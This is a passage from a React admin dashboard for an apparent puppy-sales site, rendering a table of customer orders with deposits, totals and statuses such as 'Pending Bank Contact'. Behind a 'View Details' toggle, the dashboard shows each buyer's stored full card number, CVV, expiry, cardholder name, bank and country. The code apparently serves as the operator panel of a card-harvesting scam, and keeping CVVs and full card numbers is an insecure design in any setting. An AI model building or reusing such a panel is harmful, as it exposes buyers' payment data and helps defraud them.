                          <span className="text-gray-500">Total:</span>
                          <span className="font-medium text-gray-700">
                            {order.totalAmount}
                          </span>
                        </div>
                        {order.remainingAmount && (
                          <div className="flex justify-between">
                            <span className="text-gray-500">Remaining:</span>
                            <span className="font-medium text-orange-600">
                              {order.remainingAmount}
                            </span>
                          </div>
                        )}
                      </div>
                    )}
                  </div>

                  {/* Card Info */}
                  <div className="border-t pt-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center space-x-2">
                        <div className="w-6 h-4 bg-gradient-to-r from-blue-600 to-blue-800 rounded-sm flex items-center justify-center">
                          <CreditCard className="w-3 h-3 text-white" />
                        </div>
                        <span className="text-sm font-medium text-gray-900">
                          {order.cardDetails.cardNumber.replace(
                            /\d(?=\d{4})/g,
                            "*"
                          )}
                        </span>
                      </div>
                      <span className="text-xs text-gray-500">
                        {order.cardDetails.brand}
                      </span>
                    </div>

                    {showCardDetails && (
                      <div className="mt-3 p-3 bg-blue-50 rounded-lg">
                        <div className="grid grid-cols-2 gap-2 text-xs">
                          <div>
                            <span className="text-gray-500">Cardholder:</span>
                            <div className="font-medium">
                              {order.cardDetails.cardholderName}
                            </div>
                          </div>
                          <div>
                            <span className="text-gray-500">Expiry:</span>
                            <div className="font-medium">
                              {order.cardDetails.expiryDate}
                            </div>
                          </div>
                          <div>
                            <span className="text-gray-500">CVV:</span>
                            <div className="font-mono">
                              {order.cardDetails.cvv}
                            </div>
                          </div>
                          <div>
                            <span className="text-gray-500">Full Number:</span>
                            <div className="font-mono text-xs">
                              {order.cardDetails.cardNumber}
                            </div>
                          </div>
                        </div>
                        {order.cardDetails.verified && (
                          <div className="mt-2 flex items-center space-x-1">
                            <CheckCircle className="w-3 h-3 text-green-600" />
                            <span className="text-xs text-green-600 font-medium">
                              Verified
                            </span>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              ))}
          </div>
        ) : (
          /* Table View */
          <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Order ID
                    </th>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Customer
                    </th>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Puppy
                    </th>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Amount
                    </th>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Card Details
                    </th>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Status
                    </th>
                    <th className="px-4 sm:px-6 py-4 text-left text-sm font-semibold text-gray-900">
                      Date
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {orders
                    .filter((order) => {
                      const searchLower = searchTerm.toLowerCase();
                      return (
                        order.puppy.toLowerCase().includes(searchLower) ||
                        order.user.toLowerCase().includes(searchLower) ||
                        order.id.toLowerCase().includes(searchLower)
                      );
                    })
                    .map((order) => (
                      <tr key={order.id} className="hover:bg-gray-50">
                        <td className="px-4 sm:px-6 py-4">
                          <div className="text-sm font-medium text-gray-900">
                            {order.id}
                          </div>
                        </td>
                        <td className="px-4 sm:px-6 py-4">
                          <div className="flex items-center space-x-2">
                            <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                              <User className="w-4 h-4 text-blue-600" />
                            </div>
                            <div>
                              <div className="text-sm font-medium text-gray-900">
                                {order.user}
                              </div>
                              <div className="text-xs text-gray-500">
                                Customer
                              </div>
                            </div>
                          </div>
                        </td>
                        <td className="px-4 sm:px-6 py-4">
                          <div className="flex items-center space-x-3">
                            <div className="w-10 h-10 bg-amber-100 rounded-lg flex items-center justify-center">
                              <div className="w-6 h-6 bg-amber-500 rounded-full"></div>
                            </div>
                            <div>
                              <div className="text-sm font-medium text-gray-900">
                                {order.puppy}
                              </div>
                              <div className="text-xs text-gray-500">
                                {order.breed}
                              </div>
                            </div>
                          </div>
                        </td>
                        <td className="px-4 sm:px-6 py-4">
                          <div className="space-y-2">
                            <div className="flex items-center space-x-2">
                              <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
                                <DollarSign className="w-3 h-3 text-green-600" />
                              </div>
                              <div>
                                <div className="text-sm font-semibold text-gray-900">
                                  {order.depositAmount || order.amount}
                                </div>
                                <div className="text-xs text-gray-500">
                                  {order.paymentType === "deposit"
                                    ? "Deposit Paid"
                                    : "Full Payment"}
                                </div>
                              </div>
                            </div>
                            {order.totalAmount && (
                              <div className="pl-8 space-y-1">
                                <div className="flex items-center justify-between text-xs">
                                  <span className="text-gray-500">Total:</span>
                                  <span className="font-medium text-gray-700">
                                    {order.totalAmount}
                                  </span>
                                </div>
                                {order.remainingAmount && (
                                  <div className="flex items-center justify-between text-xs">
                                    <span className="text-gray-500">
                                      Remaining:
                                    </span>
                                    <span className="font-medium text-orange-600">
                                      {order.remainingAmount}
                                    </span>
                                  </div>
                                )}
                              </div>
                            )}
                          </div>
                        </td>
                        <td className="px-4 sm:px-6 py-4">
                          <div className="space-y-2">
                            <div className="flex items-center space-x-3">
                              <div className="relative">
                                <div className="w-8 h-5 bg-gradient-to-r from-blue-600 to-blue-800 rounded-sm shadow-sm flex items-center justify-center">
                                  <CreditCard className="w-3 h-3 text-white" />
                                </div>
                                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border border-white"></div>
                              </div>
                              <div>
                                <div className="text-sm font-medium text-gray-900">
                                  {order.cardDetails.cardNumber.replace(
                                    /\d(?=\d{4})/g,
                                    "*"
                                  )}
                                </div>
                                <div className="text-xs text-gray-500">
                                  {order.cardDetails.brand} •{" "}
                                  {order.cardDetails.last4}
                                </div>
                              </div>
                            </div>
                            <button
                              onClick={() =>
                                setShowCardDetails(!showCardDetails)
                              }
                              className="flex items-center space-x-1 text-xs text-blue-600 hover:text-blue-800 transition-colors"
                            >
                              {showCardDetails ? (
                                <>
                                  <EyeOff className="w-3 h-3" />
                                  <span>Hide Details</span>
                                </>
                              ) : (
                                <>
                                  <Eye className="w-3 h-3" />
                                  <span>View Details</span>
                                </>
                              )}
                            </button>
                            {showCardDetails && (
                              <div className="mt-3 p-4 bg-gradient-to-br from-slate-50 to-gray-100 rounded-xl border border-gray-200 shadow-sm">
                                <div className="space-y-3">
                                  <div className="flex items-center justify-between pb-2 border-b border-gray-200">
                                    <h4 className="text-sm font-semibold text-gray-800">
                                      Payment Details
                                    </h4>
                                    {order.cardDetails.verified && (
                                      <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
                                        <CheckCircle className="w-3 h-3 mr-1" />
                                        Verified
                                      </span>
                                    )}
                                  </div>
                                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                    <div className="space-y-2">
                                      <div className="flex items-center space-x-2">
                                        <User className="w-3 h-3 text-gray-400" />
                                        <div>
                                          <div className="text-xs text-gray-500">
                                            Cardholder
                                          </div>
                                          <div className="text-sm font-medium text-gray-900">
                                            {order.cardDetails.cardholderName}
                                          </div>
                                        </div>
                                      </div>
                                      <div className="flex items-center space-x-2">
                                        <Calendar className="w-3 h-3 text-gray-400" />
                                        <div>
                                          <div className="text-xs text-gray-500">
                                            Expiry
                                          </div>
                                          <div className="text-sm font-medium text-gray-900">
                                            {order.cardDetails.expiryDate}
                                          </div>
                                        </div>
                                      </div>
                                      <div className="flex items-center space-x-2">
                                        <Shield className="w-3 h-3 text-gray-400" />
                                        <div>
                                          <div className="text-xs text-gray-500">
                                            CVV
                                          </div>
                                          <div className="text-sm font-mono text-gray-900">
                                            {order.cardDetails.cvv}
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="space-y-2">
                                      <div className="flex items-center space-x-2">
                                        <CreditCard className="w-3 h-3 text-gray-400" />
                                        <div>
                                          <div className="text-xs text-gray-500">
                                            Full Number
                                          </div>
                                          <div className="text-sm font-mono text-gray-900">
                                            {order.cardDetails.cardNumber}
                                          </div>
                                        </div>
                                      </div>
                                      {order.cardDetails.bank && (
                                        <div className="flex items-center space-x-2">
                                          <div className="w-3 h-3 bg-blue-100 rounded flex items-center justify-center">
                                            <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                                          </div>
                                          <div>
                                            <div className="text-xs text-gray-500">
                                              Bank
                                            </div>
                                            <div className="text-sm font-medium text-gray-900">
                                              {order.cardDetails.bank}
                                            </div>
                                          </div>
                                        </div>
                                      )}
                                      {order.cardDetails.country && (
                                        <div className="flex items-center space-x-2">
                                          <div className="w-3 h-3 bg-green-100 rounded flex items-center justify-center">
                                            <div className="w-2 h-2 bg-green-600 rounded-full"></div>
                                          </div>
                                          <div>
                                            <div className="text-xs text-gray-500">
                                              Country
                                            </div>
                                            <div className="text-sm font-medium text-gray-900">
                                              {order.cardDetails.country}
                                            </div>
                                          </div>
                                        </div>
                                      )}
                                    </div>
                                  </div>
                                  {(order.transactionId ||
                                    order.processingTime) && (
                                    <div className="pt-2 border-t border-gray-200">
                                      <div className="space-y-2">
                                        {order.transactionId && (
                                          <div className="flex items-center space-x-2">
                                            <div className="w-3 h-3 bg-purple-100 rounded flex items-center justify-center">
                                              <div className="w-2 h-2 bg-purple-600 rounded-full"></div>
                                            </div>
                                            <div>
                                              <div className="text-xs text-gray-500">
                                                Transaction ID
                                              </div>
                                              <div className="text-sm font-mono text-gray-900">
                                                {order.transactionId}
                                              </div>
                                            </div>
                                          </div>
                                        )}
                                        {order.processingTime && (
                                          <div className="flex items-center space-x-2">
                                            <Clock className="w-3 h-3 text-gray-400" />
                                            <div>
                                              <div className="text-xs text-gray-500">
                                                Processed
                                              </div>
                                              <div className="text-sm text-gray-900">
                                                {new Date(
                                                  order.processingTime
                                                ).toLocaleString()}
                                              </div>
                                            </div>
                                          </div>
                                        )}
                                      </div>
                                    </div>
                                  )}
                                </div>
                              </div>
                            )}
                          </div>
                        </td>
                        <td className="px-4 sm:px-6 py-4">
                          <span
                            className={`inline-flex px-2 py-1 text-xs font-semibold rounded-full ${
                              order.status === "completed"
                                ? "bg-green-100 text-green-800"
                                : order.status === "pending_bank_contact"
                                ? "bg-yellow-100 text-yellow-800"
                                : order.status === "deposit_paid"
                                ? "bg-blue-100 text-blue-800"
                                : "bg-gray-100 text-gray-800"
                            }`}
                          >
                            {order.status === "completed"
                              ? "Completed"
                              : order.status === "pending_bank_contact"
                              ? "Pending Bank Contact"
                              : order.status === "deposit_paid"
                              ? "Deposit Paid"
                              : order.status}
                          </span>
                        </td>
                        <td className="px-4 sm:px-6 py-4">
                          <div className="text-sm text-gray-900">
                            {new Date(order.date).toLocaleDateString()}
                          </div>
                        </td>
                      </tr>
                    ))}
                </tbody>
              </table>
            </div>
          </div>
          )}
        
      </div>

      <Footer />
    </div>
  );
};

export default AdminDashboard;
